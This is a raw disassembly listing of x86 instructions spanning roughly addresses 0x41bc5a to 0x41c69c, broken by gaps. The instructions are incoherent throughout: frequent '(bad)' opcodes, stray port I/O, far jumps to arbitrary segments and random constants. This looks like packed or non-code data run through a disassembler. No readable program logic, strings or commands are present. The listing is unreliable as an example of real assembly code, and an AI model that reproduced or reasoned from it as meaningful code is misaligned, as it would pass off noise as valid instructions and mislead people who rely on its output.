  41bc5a:	rcl    DWORD PTR [esi-0x4a522111],0x87
  41bc61:	inc    eax
  41bc62:	leave  
  41bc63:	mov    dh,0xa0
  41bc65:	pop    eax
  41bc66:	push   ebx
  41bc67:	push   edi
  41bc68:	std    
  41bc69:	dec    ebx
  41bc6b:	rol    cl,0x11
  41bc6e:	(bad)  [ebp-0x76]
  41bc71:	xchg   ecx,eax
  41bc72:	pop    ecx
  41bc73:	ret    0x3576
  41bc76:	add    edi,0x67a4b52b
  41bc7c:	test   eax,0x280b8840
  41bc81:	das    
  41bc82:	mov    ss,WORD PTR [ecx-0x3b53a002]
  41bc88:	xor    DWORD PTR [ebx-0x46],esp
  41bc8b:	int3   
  41bc8c:	mov    cl,0x25
  41bc8e:	aas    
  41bc8f:	imul   ecx,DWORD PTR gs:[esi+0x2a],0x33fc5f03
  41bc97:	mov    edx,0x8bedfbba
  41bc9c:	lds    ebx,FWORD PTR [edi]
  41bc9e:	push   0xffffffdb
  41bca0:	jl     0x41bc60
  41bca2:	or     BYTE PTR [esp+edx*1+0x6a1561e6],bh
  41bca9:	int    0xf3
  41bcab:	(bad)  
  41bcac:	xor    BYTE PTR [edi+esi*8+0x3d597d7d],ah
  41bcb3:	fisttp WORD PTR [esi]
  41bcb5:	mov    ah,BYTE PTR [ecx+0x26]
  41bcb8:	mov    ebp,DWORD PTR ds:[edx]
  41bcbb:	cmc    
  41bcbc:	add    DWORD PTR [ecx-0x445b87d3],esi
  41bcc2:	retf   0x5a88
  41bcc5:	mov    eax,0xfe1fb310
  41bcca:	push   edx
  41bccb:	push   esp
  41bccc:	inc    edi
  41bccd:	in     eax,dx
  41bcce:	clc    
  41bccf:	mov    WORD PTR [ebp+0x6711f683],gs
  41bcd5:	(bad)  
  41bcd6:	jl     0x41bd48
  41bcd8:	add    al,0xd
  41bcda:	imul   DWORD PTR [esp+ecx*1]
  41bcdd:	aam    0x2b
  41bcdf:	cmp    DWORD PTR [esi+edi*1-0x4a],edx
  41bce3:	inc    eax
  41bce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bce5:	inc    ecx
  41bce6:	sti    
  41bce7:	test   BYTE PTR [eax-0x76],bl
  41bcea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bceb:	outs   dx,DWORD PTR ds:[esi]
  41bcec:	stc    
  41bced:	retf   
	...
  41bd56:	shl    BYTE PTR [edx],cl
  41bd58:	cli    
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0x2891d9d8
  41bd64:	and    BYTE PTR [eax+0x12b67],ah
  41bd6a:	add    BYTE PTR [ecx],al
  41bd6c:	add    BYTE PTR [eax],al
  41bd6e:	cmp    bh,cl
  41bd70:	push   edx
  41bd71:	adc    al,0x15
  41bd73:	push   es
  41bd74:	addr16 leave 
  41bd76:	call   0xa960:0x4739551f
  41bd7d:	scas   eax,DWORD PTR es:[edi]
  41bd7e:	adc    al,0x80
  41bd80:	dec    esp
  41bd81:	fiadd  DWORD PTR [ecx]
  41bd83:	and    al,0xdc
  41bd85:	(bad)  
  41bd87:	sbb    ebx,edx
  41bd89:	or     eax,0xad5e3da4
  41bd8e:	jnp    0x41bd46
  41bd90:	push   ebp
  41bd91:	add    eax,0xd5393f57
  41bd96:	cs std 
  41bd98:	xchg   ebp,eax
  41bd99:	adc    al,0x4
  41bd9b:	mov    BYTE PTR [edx-0x16],ch
  41bd9e:	not    eax
  41bda0:	ror    DWORD PTR [ecx+0x14],cl
  41bda3:	mov    ds:0x76c0b2b9,eax
  41bda8:	mov    eax,ds:0x842b61b9
  41bdad:	xchg   edi,eax
  41bdae:	out    0xcf,al
  41bdb0:	push   ds
  41bdb1:	retf   
  41bdb2:	adc    BYTE PTR [edx+eax*1+0x5c081677],bh
  41bdb9:	ror    DWORD PTR [edi],1
  41bdbb:	ffreep st(5)
  41bdbd:	sub    esi,DWORD PTR ds:0x75cd56e3
  41bdc3:	loop   0x41bdd9
  41bdc5:	jmp    0x75c8:0x1719c0ca
  41bdcc:	dec    eax
  41bdcd:	fisubr DWORD PTR [esi-0x78]
  41bdd0:	idiv   BYTE PTR gs:[ebp-0x42f3f6e0]
  41bdd7:	sti    
  41bdd8:	mov    WORD PTR [ebx-0x36e18045],gs
  41bdde:	addr16 nop
  41bde0:	cmp    eax,0xb4934a7d
  41bde5:	sub    al,0xb3
  41bde7:	adc    cl,dh
  41bde9:	or     edi,DWORD PTR [esi]
  41bdeb:	cli    
  41bdec:	adc    eax,0x8ea69aa4
  41bdf1:	jp     0x41bdaa
  41bdf3:	push   ss
  41bdf4:	out    dx,al
  41bdf5:	and    DWORD PTR [eax-0x668d87b6],edi
  41bdfb:	lea    esi,[edi+ecx*1-0x285e9dda]
  41be02:	arpl   WORD PTR [ebp+0x48],di
  41be05:	sti    
  41be06:	push   cs
  41be07:	xor    edi,DWORD PTR [edi-0x43]
  41be0a:	aad    0x27
  41be0c:	xchg   ebx,eax
  41be0d:	test   al,0xcd
  41be0f:	add    eax,0x7ea704c2
  41be14:	fs and eax,0x2b115f9d
  41be1a:	mov    ch,0x68
  41be1c:	xchg   esi,eax
  41be1d:	pop    ss
  41be1e:	ds mov edx,0x2080196f
  41be24:	push   ds
  41be25:	cmc    
  41be26:	sub    al,0xfa
  41be28:	outs   dx,DWORD PTR ds:[esi]
  41be29:	lds    edx,FWORD PTR es:0x3e21680a
  41be30:	mov    bl,0x18
  41be32:	push   ebx
  41be33:	mov    BYTE PTR [ebp+0x4f],0x6a
  41be37:	sub    al,0x80
  41be39:	mov    ?,WORD PTR [edi-0x1a]
  41be3c:	adc    eax,0x17e479b4
  41be41:	sbb    DWORD PTR ds:0x66c16426,0x2c
  41be48:	addr16 js 0x41be02
  41be4b:	mov    eax,ds:0xf2685719
  41be50:	(bad)  
  41be53:	pop    ebx
  41be54:	or     eax,0x57909a01
  41be5a:	inc    esi
  41be5b:	xlat   BYTE PTR ds:[ebx]
  41be5c:	mov    ecx,0xdf3833ed
  41be61:	push   ebp
  41be62:	mov    esp,0xfb9869e3
  41be67:	lock and BYTE PTR [edx+0x6b],bh
  41be6b:	ret    0x4d01
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx-0x28e5c09a]
  41bee4:	stos   BYTE PTR es:[edi],al
  41bee5:	mov    bh,0x67
  41bee7:	sub    al,0x1
  41bee9:	add    BYTE PTR [eax],al
  41beeb:	add    DWORD PTR [eax],eax
  41beed:	add    bh,ah
  41beef:	pop    ebp
  41bef0:	icebp  
  41bef1:	adc    edi,DWORD PTR [ebx+eiz*4-0x23]
  41bef5:	push   edx
  41bef6:	ret    0x2650
  41bef9:	shr    eax,1
  41befb:	stos   BYTE PTR es:[di],al
  41befd:	push   DWORD PTR [esi+0x7e55aaaf]
  41bf03:	sub    BYTE PTR [ebx],al
  41bf05:	arpl   WORD PTR [ecx-0x4],cx
  41bf08:	fisubr WORD PTR ds:0x33ac3f7c
  41bf0e:	dec    ebx
  41bf0f:	sub    eax,DWORD PTR [edx+0x1c3732a8]
  41bf15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf16:	cmp    bl,BYTE PTR [esi]
  41bf18:	mov    ah,BYTE PTR [edi-0x1eba0012]
  41bf1e:	sti    
  41bf1f:	icebp  
  41bf20:	(bad)  
  41bf21:	xor    BYTE PTR [ecx-0x4d5aabb2],ah
  41bf27:	fnstenv [edi-0x2113b9d8]
  41bf2d:	cmp    DWORD PTR [ebp+0x4d],edi
  41bf30:	adc    BYTE PTR [eax],bh
  41bf32:	mov    edi,0xbb1bd0b
  41bf37:	push   edi
  41bf38:	cli    
  41bf39:	sub    bl,bl
  41bf3b:	scas   al,BYTE PTR es:[edi]
  41bf3c:	sbb    BYTE PTR [ebp-0x19],ah
  41bf3f:	jge    0x41bf0f
  41bf41:	nop
  41bf42:	ds in  al,dx
  41bf44:	mov    BYTE PTR [edx-0x13eeee5d],dl
  41bf4a:	cs sub ebx,edx
  41bf4d:	mov    eax,0xfa3fe1ba
  41bf52:	sub    eax,DWORD PTR [edx+0x2]
  41bf55:	xor    eax,DWORD PTR gs:[ecx+0x37289bc]
  41bf5c:	ins    BYTE PTR es:[edi],dx
  41bf5d:	(bad)  
  41bf5e:	aam    0xd1
  41bf60:	xor    eax,DWORD PTR ds:0x2fde5618
  41bf66:	in     eax,0x1c
  41bf68:	mov    edx,0x55eb22b9
  41bf6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf6e:	mov    ss,WORD PTR [ebp+ebp*4+0x774be134]
  41bf75:	add    BYTE PTR [ebp+0x63f8ab88],dh
  41bf7b:	mov    al,0xae
  41bf7d:	inc    esp
  41bf7e:	ds fs loope 0x41bf5e
  41bf82:	ds enter 0x1d2f,0x9d
  41bf87:	sbb    al,al
  41bf89:	pop    edi
  41bf8a:	sti    
  41bf8b:	inc    ecx
  41bf8c:	or     eax,0x74acb968
  41bf91:	lea    esp,[ebx+0x66b068c2]
  41bf97:	inc    edi
  41bf98:	mov    esp,0x2c490141
  41bf9d:	mov    ah,0xf1
  41bf9f:	fwait
  41bfa0:	push   eax
  41bfa1:	push   ebx
  41bfa2:	jb     0x41c00f
  41bfa4:	dec    ebx
  41bfa5:	(bad)  
  41bfa6:	pop    ds
  41bfa7:	and    BYTE PTR [edi+0x13],ah
  41bfaa:	fcom   DWORD PTR [edx-0x477895c5]
  41bfb0:	and    BYTE PTR [esi],bh
  41bfb2:	sub    eax,0xff6b39bd
  41bfb7:	rcr    ch,cl
  41bfb9:	ret    
  41bfba:	jne    0x41bf4b
  41bfbc:	and    ecx,DWORD PTR [ebp+0x1]
  41bfbf:	adc    dl,BYTE PTR [esi-0xfdeb50a]
  41bfc5:	lods   al,BYTE PTR ds:[esi]
  41bfc6:	jbe    0x41c002
  41bfc8:	lods   al,BYTE PTR ds:[esi]
  41bfc9:	cmp    BYTE PTR [esi+0x3972fdaa],ch
  41bfcf:	(bad)  
  41bfd0:	jge    0x41bfc2
  41bfd2:	and    DWORD PTR [eax-0xd],0xffffffba
  41bfd6:	enter  0x15c,0x90
  41bfda:	or     al,0x13
  41bfdc:	mov    ecx,0x76aac4fb
  41bfe1:	loope  0x41c052
  41bfe3:	test   DWORD PTR [edi],ebx
  41bfe5:	cs pop eax
  41bfe7:	std    
  41bfe8:	inc    edi
  41bfe9:	test   al,0x86
  41bfeb:	cdq    
  41bfec:	inc    ecx
  41bfed:	loop   0x41bfef
	...
  41c053:	add    BYTE PTR [eax],al
  41c055:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	add    DWORD PTR [esi+edx*8+0x39],0x67
  41c067:	sub    eax,0x1000001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	js     0x41c083
  41c070:	xor    esp,ebx
  41c072:	dec    esi
  41c073:	mov    edi,0xe575f688
  41c078:	lock ret 0x53c
  41c07c:	jg     0x41c02f
  41c07e:	outs   dx,DWORD PTR ds:[esi]
  41c07f:	(bad)  
  41c080:	rcl    DWORD PTR [ebp-0x22],1
  41c083:	pop    esp
  41c084:	pop    ebx
  41c085:	mov    DWORD PTR [edi-0x10],edi
  41c088:	enter  0x92e8,0xdd
  41c08c:	das    
  41c08d:	call   0x7962f637
  41c092:	and    eax,0x112dec49
  41c097:	sbb    DWORD PTR [ebx],ebp
  41c099:	out    0xed,eax
  41c09b:	outs   dx,BYTE PTR ds:[esi]
  41c09c:	xchg   DWORD PTR [eax+0x2be27897],eax
  41c0a2:	pop    ebp
  41c0a3:	fsincos 
  41c0a5:	xchg   DWORD PTR [ebx+0x62],ebp
  41c0a8:	mov    ebx,DWORD PTR [edi-0x66f3514b]
  41c0ae:	mov    ecx,0x219eafe5
  41c0b3:	push   esp
  41c0b4:	fdivrp st(1),st
  41c0b6:	neg    BYTE PTR [esi]
  41c0b8:	mov    ebx,0x699334dc
  41c0bd:	mov    eax,0xd977a189
  41c0c2:	sbb    ebx,edx
  41c0c4:	pop    ebp
  41c0c5:	retf   0xc98
  41c0c8:	add    eax,DWORD PTR [ecx]
  41c0ca:	stos   BYTE PTR es:[edi],al
  41c0cb:	ficomp DWORD PTR [esi-0x21]
  41c0ce:	and    al,0x0
  41c0d0:	xchg   DWORD PTR [ecx],ebp
  41c0d2:	out    0x4c,eax
  41c0d4:	mov    BYTE PTR [eax+0x2ed734e1],al
  41c0da:	or     DWORD PTR [esi+0x337dd5c8],edx
  41c0e0:	pop    es
  41c0e1:	repz mov eax,ds:0xd5f04ab0
  41c0e7:	iret   
  41c0e8:	or     bl,BYTE PTR [esi-0x188a6942]
  41c0ee:	cmp    esi,DWORD PTR [ecx]
  41c0f0:	loop   0x41c100
  41c0f2:	in     eax,dx
  41c0f3:	(bad)  
  41c0f4:	aad    0xfe
  41c0f6:	dec    esp
  41c0f7:	test   al,0x17
  41c0f9:	adc    al,0x8d
  41c0fb:	(bad)  [ecx-0x23]
  41c0fe:	push   ss
  41c0ff:	fwait
  41c100:	in     eax,dx
  41c101:	jp     0x41c118
  41c103:	nop
  41c104:	or     ebx,DWORD PTR [ebx]
  41c106:	jnp    0x41c100
  41c108:	mov    ebp,0x10030490
  41c10d:	popf   
  41c10e:	or     edx,DWORD PTR [ebx]
  41c110:	fwait
  41c111:	jge    0x41c107
  41c113:	push   ebp
  41c114:	sbb    DWORD PTR [eax],edx
  41c116:	or     al,0x62
  41c118:	xchg   esi,eax
  41c119:	mov    ds:0xb524f75b,eax
  41c11e:	std    
  41c11f:	xor    eax,0xcf761c51
  41c124:	mov    ecx,0x69708dce
  41c129:	jecxz  0x41c146
  41c12b:	add    dh,BYTE PTR [ebx-0xda52a25]
  41c131:	or     esi,DWORD PTR [edi]
  41c133:	cld    
  41c134:	dec    esi
  41c135:	pushf  
  41c136:	pop    ds
  41c137:	shl    DWORD PTR [edi-0x3f],1
  41c13a:	lea    ebx,[esi+0x51281a1b]
  41c140:	xor    esi,ebx
  41c142:	sub    BYTE PTR [esi-0x1a],dl
  41c145:	out    dx,al
  41c146:	mov    ch,0x6e
  41c148:	xchg   edx,eax
  41c149:	xor    DWORD PTR [ecx+0x72],edi
  41c14c:	jmp    0x9638:0xe78336e8
  41c153:	in     al,0x98
  41c155:	pop    es
  41c156:	cmp    eax,0xeff25cc3
  41c15b:	inc    ebp
  41c15c:	ss jg  0x41c159
  41c15f:	push   esi
  41c160:	cli    
  41c161:	popf   
  41c162:	js     0x41c140
  41c164:	ja     0x41c113
  41c166:	outs   dx,DWORD PTR ds:[esi]
  41c167:	cmp    al,0x0
  41c169:	std    
  41c16a:	aaa    
  41c16b:	lods   al,BYTE PTR ds:[esi]
  41c16c:	or     eax,DWORD PTR [eax]
	...
  41c1d6:	(bad)  [edx-0x5f]
  41c1d9:	clc    
  41c1da:	mov    bl,0xfb
  41c1dc:	fldcw  WORD PTR [ebx+0x3d]
  41c1df:	add    DWORD PTR ds:0x4c240be9,eax
  41c1e5:	call   0x42f051
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	iret   
  41c1ef:	popa   
  41c1f0:	xor    BYTE PTR [ebx+ebp*2],cl
  41c1f3:	fstp   TBYTE PTR [eax*2+0x1ebe8dbe]
  41c1fa:	aam    0x75
  41c1fc:	outs   dx,BYTE PTR ds:[esi]
  41c1fd:	push   eax
  41c1fe:	mov    esi,0xfd5401dc
  41c203:	xchg   esi,eax
  41c204:	sar    BYTE PTR [esi+ebx*4],cl
  41c207:	stos   DWORD PTR es:[edi],eax
  41c208:	cmp    dl,BYTE PTR [edx-0x52]
  41c20b:	retf   
  41c20c:	pop    ds
  41c20d:	sbb    eax,0x52e366ce
  41c212:	jb     0x41c1be
  41c214:	lods   al,BYTE PTR ds:[esi]
  41c215:	lds    esp,FWORD PTR [ebx]
  41c217:	outs   dx,BYTE PTR ds:[esi]
  41c218:	push   eax
  41c219:	loop   0x41c1fe
  41c21b:	les    ebx,FWORD PTR ds:0x9eedda96
  41c221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c222:	cmp    dh,BYTE PTR [esi]
  41c224:	or     bh,BYTE PTR [edx-0x4a]
  41c227:	ins    DWORD PTR es:[edi],dx
  41c228:	dec    ebx
  41c229:	enter  0x3b58,0xe7
  41c22d:	mov    ds:0x773397db,eax
  41c232:	jb     0x41c28c
  41c234:	and    DWORD PTR [eax+edx*4],edi
  41c237:	or     DWORD PTR [edi-0x78],0xffffff92
  41c23b:	shr    DWORD PTR [edx-0x601ffe82],0xa2
  41c242:	and    esp,DWORD PTR [ebp+0x6d05429]
  41c248:	xchg   edi,eax
  41c249:	jno    0x41c21b
  41c24b:	int3   
  41c24c:	dec    edi
  41c24d:	popa   
  41c24e:	mov    eax,0x209c8ad9
  41c253:	dec    edx
  41c254:	xor    al,0x30
  41c256:	cmp    BYTE PTR [ecx+0x4d0e0fdb],dl
  41c25c:	sbb    ecx,DWORD PTR [edi]
  41c25e:	xor    BYTE PTR [edi],0xd9
  41c261:	in     al,dx
  41c262:	sbb    al,0x9a
  41c264:	sub    al,0xd
  41c266:	inc    esi
  41c267:	repz cwde 
  41c269:	(bad)  
  41c26a:	(bad)  
  41c26b:	imul   ecx,DWORD PTR [ecx],0xd
  41c26e:	push   esi
  41c26f:	ret    0x758f
  41c272:	fild   QWORD PTR [edi-0x2bbbba40]
  41c278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c279:	push   edi
  41c27a:	dec    esp
  41c27b:	scas   al,BYTE PTR es:[edi]
  41c27c:	push   ds
  41c27d:	ins    DWORD PTR es:[edi],dx
  41c27e:	clc    
  41c27f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c280:	mov    WORD PTR [edx-0x3d8c57eb],es
  41c286:	cmp    al,0xb7
  41c288:	imul   esp,ebp,0x1bb3877b
  41c28e:	pop    eax
  41c28f:	mov    ah,0x1e
  41c291:	dec    ebx
  41c292:	and    dl,dh
  41c294:	call   DWORD PTR ds:0xbc16da82
  41c29a:	bound  edx,QWORD PTR [edx]
  41c29c:	dec    ecx
  41c29d:	sbb    al,0xea
  41c29f:	mov    al,0xd3
  41c2a1:	call   0x1b80e77e
  41c2a6:	mov    ds:0x783ac48c,eax
  41c2ab:	mov    ds:0xe64fa7c1,al
  41c2b0:	rol    BYTE PTR [esi+eiz*2-0x59636c18],1
  41c2b7:	gs aad 0xa3
  41c2ba:	or     DWORD PTR [edi-0x1096b164],0xffffffaa
  41c2c1:	mov    ecx,0xe7c566fc
  41c2c6:	inc    ah
  41c2c8:	das    
  41c2c9:	out    dx,eax
  41c2ca:	cmp    edi,edx
  41c2cc:	popf   
  41c2cd:	fisubr DWORD PTR [esi-0xb467a8c]
  41c2d3:	daa    
  41c2d4:	sahf   
  41c2d5:	dec    esi
  41c2d6:	push   0x6d
  41c2d8:	loop   0x41c307
  41c2da:	in     eax,dx
  41c2db:	or     eax,0x55b14a31
  41c2e0:	sbb    BYTE PTR [edi+0x7e],ch
  41c2e3:	lea    esp,[ebp+0x68]
  41c2e6:	lahf   
  41c2e7:	repnz pop edx
  41c2e9:	ret    0x6132
  41c2ec:	cli    
  41c2ed:	imul   eax,DWORD PTR [eax],0x0
	...
  41c354:	add    BYTE PTR [eax],al
  41c356:	repz and ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	scas   eax,DWORD PTR es:[edi]
  41c363:	mov    edi,0x2f67ef2b
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	dec    ebx
  41c36f:	call   0x95b3:0x6db7c43b
  41c376:	(bad)  
  41c377:	xor    esp,DWORD PTR [esi-0x3997d24c]
  41c37d:	mov    ebp,0x3e4ad910
  41c382:	dec    edx
  41c383:	dec    ebx
  41c384:	outs   dx,BYTE PTR ds:[esi]
  41c385:	jmp    0x41c31a
  41c387:	xchg   ebx,eax
  41c388:	cmp    BYTE PTR [eax+0x7b],ah
  41c38b:	and    BYTE PTR [ebx-0xe],ch
  41c38e:	inc    eax
  41c38f:	push   edx
  41c390:	cmp    BYTE PTR [esi-0x5c519a72],0xdc
  41c397:	jmp    0xd86:0xd04c7a74
  41c39e:	mov    ah,0x2
  41c3a0:	pop    esp
  41c3a1:	add    BYTE PTR [edx],al
  41c3a3:	mov    ebp,0xd7c1c1c4
  41c3a8:	push   0x6f
  41c3aa:	ds pop ss
  41c3ac:	(bad)  
  41c3ad:	into   
  41c3ae:	add    DWORD PTR [ebx-0x29],esi
  41c3b1:	aam    0x93
  41c3b3:	and    ebp,edx
  41c3b5:	fs push edx
  41c3b7:	retf   
  41c3b8:	pop    es
  41c3b9:	or     al,0xd7
  41c3bb:	test   eax,0x45095567
  41c3c0:	xor    DWORD PTR [edx],ebp
  41c3c2:	pop    esp
  41c3c3:	test   DWORD PTR [ebx+0x668249ab],0xb43c3781
  41c3cd:	or     DWORD PTR [edx+0x46b00d83],esp
  41c3d3:	dec    ebp
  41c3d4:	or     cl,BYTE PTR [edi-0x46fde3d3]
  41c3da:	lods   al,BYTE PTR ds:[esi]
  41c3db:	hlt    
  41c3dc:	lods   al,BYTE PTR ds:[esi]
  41c3dd:	and    bl,bh
  41c3df:	xor    BYTE PTR [esi],dh
  41c3e1:	cmp    al,0x51
  41c3e3:	adc    ecx,DWORD PTR [eax-0x70]
  41c3e6:	aad    0x7f
  41c3e8:	sahf   
  41c3e9:	sbb    al,0x19
  41c3eb:	call   0x6f769b98
  41c3f0:	push   ss
  41c3f1:	push   es
  41c3f2:	dec    esi
  41c3f3:	jge    0x41c3fd
  41c3f5:	(bad)  
  41c3f6:	pop    esi
  41c3f7:	in     eax,0x37
  41c3f9:	pusha  
  41c3fa:	jne    0x41c422
  41c3fc:	pop    esi
  41c3fd:	jbe    0x41c421
  41c3ff:	ins    DWORD PTR es:[edi],dx
  41c400:	cmp    BYTE PTR [ebp-0x70419ae2],ch
  41c406:	lock inc ebx
  41c408:	scas   eax,DWORD PTR es:[edi]
  41c409:	cwde   
  41c40a:	mov    eax,0x44aa354a
  41c40f:	push   0xcaf6362c
  41c414:	mov    esp,0x12d9687b
  41c419:	mov    WORD PTR [eax*8+0x38999bfe],fs
  41c420:	pusha  
  41c421:	xchg   esi,eax
  41c422:	into   
  41c423:	enter  0xc929,0xed
  41c427:	sbb    ah,BYTE PTR [edx+0x18]
  41c42a:	ins    DWORD PTR es:[edi],dx
  41c42b:	and    al,0x7f
  41c42d:	sbb    al,0x8a
  41c42f:	fstp   DWORD PTR [ecx+ecx*8-0x75]
  41c433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c434:	les    edx,FWORD PTR [eax+0x3f9c9bc9]
  41c43a:	sbb    BYTE PTR [edx+eiz*8+0x697cf42b],al
  41c441:	jmp    0x159717b0
  41c446:	mov    DWORD PTR [ecx],edi
  41c448:	push   ebx
  41c449:	add    cl,BYTE PTR [ebx+0x5e]
  41c44c:	sbb    BYTE PTR [edi+edi*4+0x76abc867],ah
  41c453:	mov    ds:0x18c8963c,eax
  41c458:	(bad)  
  41c459:	scas   eax,DWORD PTR es:[edi]
  41c45a:	stos   BYTE PTR es:[edi],al
  41c45b:	out    0x60,al
  41c45d:	icebp  
  41c45e:	mov    cl,0x1e
  41c460:	push   ebp
  41c461:	push   cs
  41c462:	mov    edx,0x194d7ef5
  41c467:	xor    eax,0xb4c97dd
  41c46c:	or     eax,0x38
	...
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	mov    edi,0x67d3cfb4
  41c4e7:	xor    BYTE PTR [ecx],al
  41c4e9:	add    BYTE PTR [eax],al
  41c4eb:	add    DWORD PTR [eax],eax
  41c4ed:	add    BYTE PTR [ebx-0x4],ah
  41c4f0:	pusha  
  41c4f1:	fcom   QWORD PTR [esp+ecx*2]
  41c4f4:	cmc    
  41c4f5:	and    BYTE PTR [edx],ch
  41c4f7:	mov    ds:0xf0034bf5,al
  41c4fc:	add    BYTE PTR [ebx-0x4a58bf5e],bh
  41c502:	push   edi
  41c503:	or     dl,BYTE PTR [edi-0x1b]
  41c506:	xchg   ebp,eax
  41c507:	inc    ebx
  41c508:	xchg   ebp,eax
  41c509:	jbe    0x41c497
  41c50b:	cmp    ch,cl
  41c50d:	fld    st(2)
  41c50f:	dec    eax
  41c510:	or     BYTE PTR [edx+edi*2],0xd
  41c514:	adc    DWORD PTR [ecx],esi
  41c516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c517:	cs jnp 0x41c532
  41c51a:	out    dx,eax
  41c51b:	arpl   WORD PTR [ecx-0x62489d75],cx
  41c521:	aad    0xa9
  41c523:	pop    ecx
  41c524:	cli    
  41c525:	inc    ecx
  41c526:	(bad)  
  41c527:	retf   0xf4fa
  41c52a:	out    0xa5,eax
  41c52c:	jecxz  0x41c4ce
  41c52e:	sbb    DWORD PTR [esi+ecx*2-0x6e81d75e],esi
  41c535:	outs   dx,DWORD PTR ds:[esi]
  41c536:	and    al,0x77
  41c538:	idiv   BYTE PTR [esi+0x21]
  41c53b:	pop    esp
  41c53c:	pop    ebx
  41c53d:	dec    ebx
  41c53e:	inc    DWORD PTR [ebx]
  41c540:	push   edx
  41c541:	mov    edi,0xbd099e3e
  41c546:	rol    DWORD PTR [ebp+0x6dc5e3dc],cl
  41c54c:	rcr    DWORD PTR [esi],0x9d
  41c54f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c550:	xchg   ebx,eax
  41c551:	test   eax,0x19995c2b
  41c556:	mov    ebp,0x8e83d38
  41c55b:	mov    ebx,DWORD PTR [ebx-0x13]
  41c55e:	shr    DWORD PTR [eax+0x79df91bc],0xce
  41c565:	nop
  41c566:	add    BYTE PTR [esi-0x6e8dfbaa],cl
  41c56c:	scas   al,BYTE PTR es:[edi]
  41c56d:	cwde   
  41c56e:	or     ah,bl
  41c570:	xor    dh,al
  41c572:	mov    edi,0xa83581db
  41c577:	loopne 0x41c504
  41c579:	add    al,0x2d
  41c57b:	dec    ebx
  41c57c:	(bad)  
  41c57d:	cli    
  41c57e:	sub    BYTE PTR [ecx+0x6f],ah
  41c581:	(bad)  
  41c583:	jp     0x41c59d
  41c585:	ja     0x41c5a2
  41c587:	lea    ebx,[edi-0x3b]
  41c58a:	or     edi,DWORD PTR [ebp-0x54c16440]
  41c590:	dec    ecx
  41c591:	lds    edx,FWORD PTR [ecx]
  41c593:	int    0xd2
  41c595:	cli    
  41c596:	adc    al,BYTE PTR [esi]
  41c598:	call   0x965ab484
  41c59d:	shr    DWORD PTR [eax-0xa046a7],cl
  41c5a3:	jp     0x41c56e
  41c5a5:	bound  edi,QWORD PTR [ecx]
  41c5a7:	pusha  
  41c5a8:	nop
  41c5a9:	mov    eax,0x4a747553
  41c5ae:	data16 jge 0x41c629
  41c5b1:	xchg   edi,eax
  41c5b2:	mov    al,0x73
  41c5b4:	imul   DWORD PTR [edx+0x77a28f1b]
  41c5ba:	repz push esi
  41c5bc:	fs pop esi
  41c5be:	fwait
  41c5bf:	stos   BYTE PTR es:[edi],al
  41c5c0:	inc    esp
  41c5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5c2:	jle    0x41c61c
  41c5c4:	inc    edi
  41c5c5:	int    0x43
  41c5c7:	lods   al,BYTE PTR ds:[esi]
  41c5c8:	cli    
  41c5c9:	jns    0x41c563
  41c5cb:	jnp    0x41c5ad
  41c5cd:	in     al,dx
  41c5ce:	fadd   DWORD PTR ds:0xfe186f3a
  41c5d4:	dec    ecx
  41c5d5:	stos   BYTE PTR es:[edi],al
  41c5d6:	push   ds
  41c5d7:	xor    ebx,DWORD PTR [esi-0x4805d81c]
  41c5dd:	dec    ebx
  41c5de:	out    0x12,al
  41c5e0:	adc    BYTE PTR [edx+esi*1+0xc0d98c9],0x27
  41c5e8:	arpl   WORD PTR [edi],sp
  41c5ea:	mov    edx,0xa8c1c7
	...
  41c653:	add    BYTE PTR [eax],al
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0xc8f416a9
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	loop   0x41c643
  41c670:	jmp    0x34b86a86
  41c675:	imul   esp,DWORD PTR [ecx-0x4a68099],0x9b02c80f
  41c67f:	dec    ecx
  41c680:	or     DWORD PTR [ebx],esp
  41c682:	sbb    BYTE PTR [esi],al
  41c684:	push   ecx
  41c685:	test   BYTE PTR [ebp+0x20],bh
  41c688:	fsubr  QWORD PTR [edi+0x27cb70e1]
  41c68e:	pop    esi
  41c68f:	inc    esp
  41c690:	loope  0x41c6e0
  41c692:	cld    
  41c693:	ror    ah,1
  41c695:	fwait
  41c696:	xor    al,0x4c
  41c698:	mov    WORD PTR [eax],es
  41c69a:	add    BYTE PTR [ebx],dl
  41c69c:	test   BYTE PTR [edi+0x7e1ec238],dh
